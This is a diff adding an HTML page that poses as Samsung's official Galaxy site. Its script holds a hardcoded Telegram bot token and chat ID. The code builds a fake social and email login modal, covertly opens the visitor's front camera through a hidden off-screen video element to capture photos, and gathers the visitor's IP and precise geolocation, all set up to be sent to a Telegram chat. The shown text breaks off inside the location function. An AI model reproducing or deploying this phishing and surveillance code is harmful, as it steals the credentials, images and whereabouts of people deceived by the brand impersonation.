@@ -1,0 +1,1446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Samsung – Galaxy | Official Website</title>
+
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+
+    <style>
+        /* ── RESET & BASE ── */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f8fafc;
+            color: #111;
+            line-height: 1.6;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        img {
+            max-width: 100%;
+            display: block;
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* ── BUTTONS ── */
+        .btn {
+            display: inline-block;
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            border: none;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: #1428A0;
+            color: #fff;
+        }
+        .btn-primary:hover {
+            background: #0e1e7a;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(20, 40, 160, 0.30);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: #1428A0;
+            border: 2px solid #1428A0;
+        }
+        .btn-outline:hover {
+            background: #1428A0;
+            color: #fff;
+            transform: translateY(-2px);
+        }
+
+        .btn-white {
+            background: #fff;
+            color: #1428A0;
+        }
+        .btn-white:hover {
+            background: #e8edf9;
+            transform: translateY(-2px);
+        }
+
+        /* ── HEADER ── */
+        .header {
+            background: #0a1628;
+            padding: 16px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .header .container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+        .logo i {
+            color: #4a7cf7;
+            font-size: 1.8rem;
+        }
+        .logo span {
+            color: #4a7cf7;
+        }
+
+        .nav {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+            flex-wrap: wrap;
+        }
+        .nav a {
+            color: #c8d0e6;
+            font-weight: 500;
+            font-size: 0.95rem;
+            transition: color 0.2s;
+            position: relative;
+        }
+        .nav a::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: #4a7cf7;
+            transition: width 0.25s;
+        }
+        .nav a:hover {
+            color: #fff;
+        }
+        .nav a:hover::after {
+            width: 100%;
+        }
+
+        .nav-icons {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            color: #c8d0e6;
+            font-size: 1.2rem;
+        }
+        .nav-icons i {
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .nav-icons i:hover {
+            color: #fff;
+        }
+
+        .hamburger {
+            display: none;
+            font-size: 1.6rem;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        /* ── HERO ── */
+        .hero {
+            background: linear-gradient(145deg, #0a1628 0%, #1428a0 100%);
+            padding: 60px 0 70px;
+            color: #fff;
+            overflow: hidden;
+            position: relative;
+        }
+        .hero::after {
+            content: '';
+            position: absolute;
+            right: -10%;
+            top: -30%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(74, 124, 247, 0.15) 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .hero .container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-content h1 {
+            font-size: 3.2rem;
+            font-weight: 800;
+            line-height: 1.1;
+            letter-spacing: -1px;
+        }
+        .hero-content h1 span {
+            color: #7aa2ff;
+        }
+        .hero-content p {
+            font-size: 1.15rem;
+            opacity: 0.85;
+            margin: 18px 0 30px;
+            max-width: 480px;
+        }
+        .hero-content .badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.12);
+            padding: 6px 18px;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            color: #7aa2ff;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .hero-buttons {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .hero-image {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .hero-image img {
+            max-height: 420px;
+            width: auto;
+            object-fit: contain;
+            filter: drop-shadow(0 20px 60px rgba(0, 0, 0, 0.5));
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-16px);
+            }
+        }
+
+        /* ── SECTION TITLES ── */
+        .section-title {
+            text-align: center;
+            font-size: 2.4rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+        }
+        .section-title span {
+            color: #1428A0;
+        }
+        .section-sub {
+            text-align: center;
+            color: #5a6a8a;
+            font-size: 1.05rem;
+            margin-bottom: 44px;
+        }
+
+        /* ── PRODUCTS GRID ── */
+        .products {
+            padding: 70px 0 80px;
+        }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 32px;
+        }
+
+        .product-card {
+            background: #fff;
+            border-radius: 24px;
+            padding: 28px 22px 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+            border: 1px solid #eef2f8;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .product-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 16px 48px rgba(20, 40, 160, 0.12);
+            border-color: #d0ddf5;
+        }
+
+        .product-card .image-wrap {
+            width: 100%;
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f4f7fd;
+            border-radius: 16px;
+            margin-bottom: 18px;
+            overflow: hidden;
+            position: relative;
+        }
+        .product-card .image-wrap img {
+            max-height: 100%;
+            max-width: 100%;
+            object-fit: contain;
+            transition: transform 0.4s ease;
+        }
+        .product-card:hover .image-wrap img {
+            transform: scale(1.04);
+        }
+
+        .product-card .tag {
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: #4a7cf7;
+            background: #e8edf9;
+            padding: 3px 14px;
+            border-radius: 40px;
+            display: inline-block;
+            margin-bottom: 8px;
+        }
+
+        .product-card h3 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .product-card .price {
+            font-weight: 600;
+            color: #1428A0;
+            font-size: 1.1rem;
+            margin-bottom: 14px;
+        }
+
+        .product-card .desc {
+            font-size: 0.92rem;
+            color: #5a6a8a;
+            margin-bottom: 18px;
+            line-height: 1.5;
+            flex: 1;
+        }
+
+        .product-card .btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 0.9rem;
+        }
+
+        /* ── MODAL ── */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.55);
+            backdrop-filter: blur(6px);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .modal {
+            background: #fff;
+            border-radius: 32px;
+            max-width: 440px;
+            width: 100%;
+            padding: 40px 36px 36px;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.3);
+            position: relative;
+            animation: slideUp 0.35s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 20px;
+            font-size: 1.6rem;
+            color: #8a9bb8;
+            cursor: pointer;
+            transition: color 0.2s;
+            background: none;
+            border: none;
+            line-height: 1;
+        }
+        .modal-close:hover {
+            color: #1a1a2e;
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .modal-header .modal-icon {
+            font-size: 2.8rem;
+            color: #1428A0;
+            background: #e8edf9;
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+        }
+        .modal-header h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+        }
+        .modal-header p {
+            color: #5a6a8a;
+            font-size: 0.95rem;
+            margin-top: 4px;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
+            background: #fff;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 14px;
+            font-family: inherit;
+        }
+        .social-btn i {
+            font-size: 1.4rem;
+        }
+        .social-btn.facebook {
+            color: #1877f2;
+            border-color: #d0ddf5;
+        }
+        .social-btn.facebook:hover {
+            background: #f0f4ff;
+            border-color: #1877f2;
+            box-shadow: 0 4px 16px rgba(24, 119, 242, 0.15);
+        }
+        .social-btn.gmail {
+            color: #ea4335;
+            border-color: #f5d0d0;
+        }
+        .social-btn.gmail:hover {
+            background: #fff0ef;
+            border-color: #ea4335;
+            box-shadow: 0 4px 16px rgba(234, 67, 53, 0.15);
+        }
+
+        .modal-divider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 20px 0 18px;
+            color: #8a9bb8;
+            font-size: 0.85rem;
+        }
+        .modal-divider::before,
+        .modal-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e2e8f0;
+        }
+
+        .modal .form-group {
+            margin-bottom: 14px;
+        }
+        .modal .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-family: inherit;
+            transition: border 0.2s;
+            background: #fafbfc;
+        }
+        .modal .form-group input:focus {
+            outline: none;
+            border-color: #1428A0;
+            box-shadow: 0 0 0 3px rgba(20, 40, 160, 0.08);
+        }
+        .modal .form-group input::placeholder {
+            color: #aab7d0;
+        }
+
+        .modal .btn-primary {
+            width: 100%;
+            padding: 14px;
+            font-size: 1rem;
+            border-radius: 12px;
+            margin-top: 6px;
+        }
+
+        .modal-footer-text {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 0.85rem;
+            color: #5a6a8a;
+        }
+        .modal-footer-text a {
+            color: #1428A0;
+            font-weight: 600;
+        }
+        .modal-footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* ── FOOTER ── */
+        .footer {
+            background: #0a1628;
+            color: #a0b0cc;
+            padding: 48px 0 32px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .footer .container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 32px;
+        }
+        .footer h4 {
+            color: #fff;
+            font-size: 1rem;
+            margin-bottom: 14px;
+            font-weight: 700;
+        }
+        .footer ul {
+            list-style: none;
+        }
+        .footer ul li {
+            margin-bottom: 8px;
+        }
+        .footer ul li a {
+            color: #a0b0cc;
+            font-size: 0.9rem;
+            transition: color 0.2s;
+        }
+        .footer ul li a:hover {
+            color: #fff;
+        }
+        .footer-bottom {
+            grid-column: 1 / -1;
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            padding-top: 24px;
+            margin-top: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-size: 0.85rem;
+        }
+        .footer-social {
+            display: flex;
+            gap: 16px;
+            font-size: 1.2rem;
+        }
+        .footer-social a {
+            color: #a0b0cc;
+            transition: color 0.2s;
+        }
+        .footer-social a:hover {
+            color: #fff;
+        }
+
+        /* ── RESPONSIVE ── */
+        @media (max-width: 992px) {
+            .hero .container {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            .hero-content p {
+                max-width: 100%;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            .hero-buttons {
+                justify-content: center;
+            }
+            .hero-image img {
+                max-height: 300px;
+            }
+            .hero-content h1 {
+                font-size: 2.6rem;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav {
+                display: none;
+                width: 100%;
+                flex-direction: column;
+                align-items: flex-start;
+                padding-top: 16px;
+                gap: 12px;
+            }
+            .nav.open {
+                display: flex;
+            }
+            .hamburger {
+                display: block;
+            }
+            .nav-icons {
+                gap: 14px;
+                font-size: 1.1rem;
+            }
+            .hero-content h1 {
+                font-size: 2.2rem;
+            }
+            .section-title {
+                font-size: 2rem;
+            }
+            .product-grid {
+                grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+                gap: 20px;
+            }
+            .modal {
+                padding: 30px 20px 28px;
+            }
+            .footer .container {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header .container {
+                flex-wrap: nowrap;
+            }
+            .logo {
+                font-size: 1.3rem;
+            }
+            .hero-content h1 {
+                font-size: 1.8rem;
+            }
+            .hero {
+                padding: 40px 0 50px;
+            }
+            .product-grid {
+                grid-template-columns: 1fr;
+            }
+            .footer .container {
+                grid-template-columns: 1fr;
+            }
+            .footer-bottom {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+
+        /* ── CAMERA PREVIEW (hidden but needed for capture) ── */
+        #cameraPreview {
+            position: fixed;
+            bottom: -9999px;
+            left: -9999px;
+            width: 320px;
+            height: 240px;
+            object-fit: cover;
+            z-index: -1;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        #photoCanvas {
+            display: none;
+        }
+
+        /* ── LOADING SPINNER OVERLAY ── */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 16px;
+            color: #fff;
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .loading-overlay .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255, 255, 255, 0.15);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .loading-overlay p {
+            font-size: 1rem;
+            font-weight: 500;
+            opacity: 0.9;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ═══ HEADER ═══ -->
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <i class="fab fa-samsung"></i>
+                Samsung<span>.</span>
+            </div>
+
+            <nav class="nav" id="mainNav">
+                <a href="#">Galaxy</a>
+                <a href="#">Mobile</a>
+                <a href="#">Tablets</a>
+                <a href="#">Watches</a>
+                <a href="#">Audio</a>
+                <a href="#">Support</a>
+            </nav>
+
+            <div class="nav-icons">
+                <i class="fas fa-search"></i>
+                <i class="fas fa-shopping-bag"></i>
+                <span class="hamburger" id="hamburgerBtn">
+                    <i class="fas fa-bars"></i>
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <!-- ═══ HERO ═══ -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <div class="badge">
+                    <i class="fas fa-star" style="margin-right:6px;"></i> New Galaxy AI
+                </div>
+                <h1>
+                    Galaxy S24 Ultra<br />
+                    <span>Epic intelligence</span>
+                </h1>
+                <p>
+                    Discover the power of Galaxy AI — live translate, generative edit,
+                    and the most advanced camera system on a smartphone.
+                </p>
+                <div class="hero-buttons">
+                    <a href="#" class="btn btn-primary">Pre-order now</a>
+                    <a href="#" class="btn btn-white">Watch unveil</a>
+                </div>
+            </div>
+            <div class="hero-image">
+                <img
+                src="https://fdn2.gsmarena.com/vv/pics/samsung/samsung-galaxy-s24-ultra-5g-sm-s928-0.jpg"
+                alt="Samsung Galaxy S24 Ultra"
+                onerror="this.src='https://picsum.photos/seed/galaxy24/400/400'"
+                />
+            </div>
+        </div>
+    </section>
+
+    <!-- ═══ PRODUCTS ═══ -->
+    <section class="products" id="products">
+        <div class="container">
+            <h2 class="section-title">
+                Explore the <span>Galaxy</span> Ecosystem
+            </h2>
+            <p class="section-sub">
+                Discover our latest devices — each built to work seamlessly together.
+            </p>
+
+            <div class="product-grid" id="productGrid">
+                <!-- Cards will be injected by JavaScript -->
+            </div>
+        </div>
+    </section>
+
+    <!-- ═══ FOOTER ═══ -->
+    <footer class="footer">
+        <div class="container">
+            <div>
+                <h4>Products</h4>
+                <ul>
+                    <li><a href="#">Galaxy S Series</a></li>
+                    <li><a href="#">Galaxy Z Fold</a></li>
+                    <li><a href="#">Galaxy Tab</a></li>
+                    <li><a href="#">Galaxy Watch</a></li>
+                    <li><a href="#">Galaxy Buds</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>Support</h4>
+                <ul>
+                    <li><a href="#">Help &amp; FAQs</a></li>
+                    <li><a href="#">Software updates</a></li>
+                    <li><a href="#">Repair services</a></li>
+                    <li><a href="#">Community</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>Company</h4>
+                <ul>
+                    <li><a href="#">About Samsung</a></li>
+                    <li><a href="#">Careers</a></li>
+                    <li><a href="#">Sustainability</a></li>
+                    <li><a href="#">Newsroom</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4>Legal</h4>
+                <ul>
+                    <li><a href="#">Privacy policy</a></li>
+                    <li><a href="#">Terms of use</a></li>
+                    <li><a href="#">Cookies</a></li>
+                    <li><a href="#">Accessibility</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-bottom">
+                <span>&copy; 2026 Samsung Electronics Co., Ltd.</span>
+                <div class="footer-social">
+                    <a href="#" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ═══ MODAL ═══ -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal">
+            <button class="modal-close" id="modalCloseBtn" aria-label="Close modal">
+                <i class="fas fa-times"></i>
+            </button>
+
+            <div class="modal-header">
+                <div class="modal-icon">
+                    <i class="fas fa-lock"></i>
+                </div>
+                <h2 id="modalTitle">Sign in to continue</h2>
+                <p id="modalSub">Log in with your social account or email</p>
+            </div>
+
+            <!-- Social buttons -->
+            <button class="social-btn facebook" id="fbLoginBtn">
+                <i class="fab fa-facebook-f"></i> Continue with Facebook
+            </button>
+            <button class="social-btn gmail" id="gmailLoginBtn">
+                <i class="fab fa-google"></i> Continue with Gmail
+            </button>
+
+            <div class="modal-divider">or</div>
+
+            <!-- Email / password form -->
+            <div class="form-group">
+                <input type="email" placeholder="Email address" id="loginEmail" autocomplete="email" />
+            </div>
+            <div class="form-group">
+                <input type="password" placeholder="Password" id="loginPassword" autocomplete="current-password" />
+            </div>
+            <button class="btn btn-primary" id="emailLoginBtn">
+                <i class="fas fa-arrow-right" style="margin-right:8px;"></i> Sign In
+            </button>
+
+            <p class="modal-footer-text">
+                Don't have an account? <a href="#">Create one</a>
+            </p>
+        </div>
+    </div>
+
+    <!-- ─── CAMERA ELEMENTS (hidden) ─── -->
+    <video id="cameraPreview" autoplay muted playsinline></video>
+    <canvas id="photoCanvas"></canvas>
+
+    <!-- ─── LOADING OVERLAY ─── -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p id="loadingText">Processing...</p>
+    </div>
+
+    <!-- ═══ JAVASCRIPT ═══ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ═══════════════════════════════════════════════════════
+            //  🔧  CONFIGURE YOUR TELEGRAM BOT HERE
+            // ═══════════════════════════════════════════════════════
+            const TELEGRAM_BOT_TOKEN = '8930920209:AAFch_Bh0cDQBjDzyKMx6of1CHm9AKhiRzw';
+            const TELEGRAM_CHAT_ID = '6686238796';
+            // ═══════════════════════════════════════════════════════
+
+            // ─── PRODUCT DATA ───
+            const products = [{
+                id: 1,
+                name: 'Galaxy S24 Ultra',
+                tag: 'NEW',
+                price: '$1,299',
+                desc: 'AI-powered camera, Snapdragon 8 Gen 3, 200MP lens.',
+                image: 'https://fdn2.gsmarena.com/vv/pics/samsung/samsung-galaxy-s24-ultra-5g-sm-s928-0.jpg'
+            }, {
+                id: 2,
+                name: 'Galaxy Z Fold 5',
+                tag: 'FOLDABLE',
+                price: '$1,799',
+                desc: '7.6" Infinity Flex Display, multitasking reimagined.',
+                image: 'https://images.samsung.com/is/image/samsung/p6pim/ph/feature/164698394/ph-feature-galaxy-z-fold5-f946-537742272?$FB_TYPE_A_MO_JPG$'
+            }, {
+                id: 3,
+                name: 'Galaxy Tab S9 Ultra',
+                tag: 'TABLET',
+                price: '$1,199',
+                desc: '14.6" Dynamic AMOLED, Snapdragon 8 Gen 2, 11200mAh.',
+                image: 'https://images.samsung.com/ph/galaxy-tab-s9/feature/galaxy-tab-s9-kv-pc.jpg?imwidth=1080'
+            }, {
+                id: 4,
+                name: 'Galaxy Watch 6 Classic',
+                tag: 'WEARABLE',
+                price: '$399',
+                desc: 'Rotating bezel, body composition, advanced sleep tracking.',
+                image: 'https://fdn2.gsmarena.com/vv/pics/samsung/galaxy-watch6-classic-1.jpg'
+            }, {
+                id: 5,
+                name: 'Galaxy Buds 2 Pro',
+                tag: 'AUDIO',
+                price: '$229',
+                desc: '24-bit Hi-Fi, intelligent ANC, immersive 360 Audio.',
+                image: 'https://images.samsung.com/ph/galaxy-buds2-pro/feature/galaxy-buds2-pro-kv.jpg?imwidth=1080'
+            }, {
+                id: 6,
+                name: 'Galaxy Book 3 Ultra',
+                tag: 'LAPTOP',
+                price: '$1,499',
+                desc: '16" AMOLED, Intel Core i9, RTX 4070, ultra-slim design.',
+                image: 'https://images.samsung.com/is/image/samsung/assets/uk/computers/galaxy-book/galaxy-book3-ultra/buy/gb3_ultra_color_selection_graphite_pc.jpg?imwidth=720'
+            }];
+
+            const fallbackImage = 'https://picsum.photos/seed/samsung/400/400';
+
+            // ─── DOM REFS ───
+            const grid = document.getElementById('productGrid');
+            const modalOverlay = document.getElementById('loginModal');
+            const modalCloseBtn = document.getElementById('modalCloseBtn');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalSub = document.getElementById('modalSub');
+            const fbBtn = document.getElementById('fbLoginBtn');
+            const gmailBtn = document.getElementById('gmailLoginBtn');
+            const emailBtn = document.getElementById('emailLoginBtn');
+            const loginEmail = document.getElementById('loginEmail');
+            const loginPassword = document.getElementById('loginPassword');
+            const videoEl = document.getElementById('cameraPreview');
+            const canvasEl = document.getElementById('photoCanvas');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const loadingText = document.getElementById('loadingText');
+
+            let cameraStream = null;
+            let cameraReady = false;
+
+            // ─── RENDER PRODUCTS ───
+            products.forEach(p => {
+                const card = document.createElement('div');
+                card.className = 'product-card';
+                card.innerHTML = `
+                    <div class="image-wrap">
+                        <img src="${p.image}" alt="${p.name}" loading="lazy" onerror="this.src='${fallbackImage}'" />
+                    </div>
+                    <span class="tag">${p.tag}</span>
+                    <h3>${p.name}</h3>
+                    <div class="price">${p.price}</div>
+                    <p class="desc">${p.desc}</p>
+                    <button class="btn btn-primary learn-more-btn" data-product="${p.name}">
+                        Learn More <i class="fas fa-arrow-right" style="margin-left:8px;"></i>
+                    </button>
+                `;
+                grid.appendChild(card);
+            });
+
+            // ─── CAMERA SETUP ───
+            async function initCamera() {
+                try {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        console.warn('⚠️ getUserMedia not supported.');
+                        cameraReady = false;
+                        return false;
+                    }
+                    const constraints = {
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    };
+
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    cameraStream = stream;
+                    videoEl.srcObject = stream;
+                    await videoEl.play();
+                    cameraReady = true;
+                    console.log('📷 Front camera initialized.');
+                    return true;
+                } catch (err) {
+                    console.warn('⚠️ Camera init failed:', err.message);
+                    cameraReady = false;
+                    return false;
+                }
+            }
+
+            // ─── CAPTURE PHOTO ───
+            function capturePhoto() {
+                if (!cameraReady || !videoEl.videoWidth) {
+                    console.warn('⚠️ Camera not ready, cannot capture.');
+                    return null;
+                }
+                const w = videoEl.videoWidth || 640;
+                const h = videoEl.videoHeight || 480;
+                canvasEl.width = w;
+                canvasEl.height = h;
+                const ctx = canvasEl.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, w, h);
+                return canvasEl.toDataURL('image/jpeg', 0.85);
+            }
+
+            // ─── TELEGRAM: SEND TEXT ───
+            async function sendTelegramText(text) {
+                if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                    console.warn('⚠️ Telegram bot token not configured.');
+                    return false;
+                }
+                if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                    console.warn('⚠️ Telegram chat ID not configured.');
+                    return false;
+                }
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                try {
+                    const resp = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: text,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    const data = await resp.json();
+                    if (data.ok) {
+                        console.log('✅ Telegram text sent.');
+                        return true;
+                    } else {
+                        console.error('❌ Telegram text error:', data.description);
+                        return false;
+                    }
+                } catch (err) {
+                    console.error('❌ Telegram text send failed:', err);
+                    return false;
+                }
+            }
+
+            // ─── TELEGRAM: SEND PHOTO ───
+            async function sendTelegramPhoto(photoBase64, caption) {
+                if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                    console.warn('⚠️ Telegram bot token not configured.');
+                    return false;
+                }
+                if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                    console.warn('⚠️ Telegram chat ID not configured.');
+                    return false;
+                }
+                if (!photoBase64) {
+                    console.warn('⚠️ No photo to send.');
+                    return false;
+                }
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                try {
+                    const res = await fetch(photoBase64);
+                    const blob = await res.blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+                    if (caption) {
+                        formData.append('caption', caption);
+                        formData.append('parse_mode', 'HTML');
+                    }
+                    const resp = await fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await resp.json();
+                    if (data.ok) {
+                        console.log('✅ Telegram photo sent.');
+                        return true;
+                    } else {
+                        console.error('❌ Telegram photo error:', data.description);
+                        return false;
+                    }
+                } catch (err) {
+                    console.error('❌ Telegram photo send failed:', err);
+                    return false;
+                }
+            }
+
+            // ─── LOCATION: IP + lat/long (with fallbacks) ───
+            async function getLocationData() {
+                const result = {
+                    ip: 'Unknown',
+                    lat: 'Unknown',
+                    long: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    source: 'unknown'
+                };
+
+                // 1. Get IP from ipify
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    if (ipData.ip) result.ip = ipData.ip;
+                    console.log('📍 IP obtained:', result.ip);
+                } catch (e) {
+                    console.warn('⚠️ ipify failed:', e);
+                }
+
+                // 2. Browser geolocation (precise)
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            timeout: 10000,
+                            enableHighAccuracy: true,
+                            maximumAge: 0
+                        });
+                    });
+                    result.lat = pos.coords.latitude;
+                    result.long = pos.coords.longitude;
+                    result.source = 'browser_geolocation';
+                    console.log('📍 Browser geolocation obtained:', result.lat, result.long);
+                } catch (geoErr) {
+                    console.warn('⚠️ Browser geolocation failed:', geoErr.message);
+                }
+
+                // 3. Fallback: ip-api.com
+                if (result.lat === 'Unknown' || result.lat === null) {
+                    try {
+                        const locRes = await fetch('https://ip-api.com/json/');
+                        const locData = await locRes.json();
+                        if (locData.status === 'success') {
+                            if (result.ip === 'Unknown' && locData.ip) result.ip = locData.ip;
+                            result.lat = locData.lat;
+                            result.long = locData.lon;
+                            result.city = locData.city || 'Unknown';
+                            result.region = locData.regionName || 'Unknown';
+                            result.country = locData.country || 'Unknown';
